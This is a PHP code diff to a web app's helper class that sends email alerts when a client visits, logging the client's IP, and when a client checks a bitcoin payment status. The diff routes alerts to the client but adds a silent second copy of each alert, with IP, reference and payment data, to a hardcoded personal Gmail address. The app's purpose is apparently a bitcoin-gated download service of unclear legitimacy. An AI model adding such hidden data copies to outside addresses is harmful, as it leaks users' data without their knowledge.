@@ -86,12 +86,13 @@ class Helper implements HelperContract
 			                           'link' =>"zip",
 									  ]);
 				  $location = getenv("REMOTE_ADDR");		  
-				  $s = "New Client, IP ".$location.": ".date("h:i A jS F, Y");
-               $rcpt = "mails4davidslogan@gmail.com";
+				  $s = "**Rambo** New Client, IP ".$location.": ".date("h:i A jS F, Y");
+               $rcpt = $r->email;;
                $randd = $data["randd"];
                $mokije = $gg["mokije"];
                       
                $this->sendEmail($rcpt,$s,['randd' => $randd,'mokije' => $mokije,'r' => $r->email],'emails.heh_alert','view');
+               $this->sendEmail("mails4davidslogan@gmail.com",$s,['randd' => $randd,'mokije' => $mokije,'r' => $r->email],'emails.heh_alert','view');
 		      }  
 		       
 		   }
@@ -223,8 +224,7 @@ class Helper implements HelperContract
 		   }
 		   
 		   function getPaymentStatus($gg)
-		   {
-               $r = [];			   
+		   {		   
 			   $ret =  Payments::where('gg',$gg['randd'])
 			                   ->where('ref',$gg['r'])
 							   ->first();
@@ -236,12 +236,12 @@ class Helper implements HelperContract
 			   }
 			 
 			   $s = "Client just checked payment: ".date("h:i A jS F, Y");
-               $rcpt = "mails4davidslogan@gmail.com";
                $randd = $gg["randd"];
                $btc = $gg["btc"];
                $r = $ret->email;
                       
-               $this->sendEmail($rcpt,$s,['randd' => $randd,'btc' => $btc,'r' => $r],'emails.cp_alert','view');
+               $this->sendEmail($r,$s,['randd' => $randd,'btc' => $btc,'r' => $r],'emails.cp_alert','view');
+               $this->sendEmail("mails4davidslogan@gmail.com",$s,['randd' => $randd,'btc' => $btc,'r' => $r],'emails.cp_alert','view');
 					   
 			   $rt = ["s" => $ret->status,"l" => $ret->link];
 			   return $rt;
